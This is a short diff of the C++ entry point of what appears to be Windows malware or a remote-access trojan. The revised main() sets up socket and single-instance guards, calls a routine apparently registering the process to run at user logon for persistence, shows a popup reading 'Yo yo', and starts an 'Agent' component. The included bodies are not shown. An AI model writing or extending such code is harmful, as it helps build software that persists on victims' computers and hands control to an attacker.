@@ -1,20 +1,22 @@
+#include "SocketGuard.h"
+
+#include <iostream>
+
+#include "Agent.h"
 #include "PopUp.h"
 #include "Presistence.h"
 #include "Resilience.h"
-#include <iostream>
-#include <windows.h>
+#include "Mutex.h"
 
 int main(int argc, char* argv[]) {
-    try {
-        RunGuard runguard;
+    SocketGuard socketGuard;
+    RunGuard runGuard;
 
-        CurrentProcRegistryLogon();
+    CurrentProcRegistryLogon();
 
-        PopupLoop();
+    PopUp("Yo yo", POPUP_LOOP_CAPTION);
+    Agent agent;
+    agent.start();
 
-    } catch (const RunGuardException& error) {
-        std::cerr << "RunGuardException: " << error.funcName << " \n";
-        return 1;
-    }
     return 0;
 }
